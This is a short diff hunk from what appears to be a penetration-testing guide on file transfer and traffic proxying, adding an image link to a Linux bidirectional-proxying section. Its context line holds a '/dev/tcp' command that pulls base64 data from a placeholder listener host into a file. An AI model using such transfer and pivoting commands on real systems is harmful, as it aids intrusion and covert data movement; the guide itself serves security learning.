@@ -446,6 +446,8 @@ cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/fil
 
 ##### Proxying Bidirectional Traffic (Linux):
 
+![](./imgs/lin-lin-proxy.png)
+
 Proxying Machine:
 
 - Create a named pipe
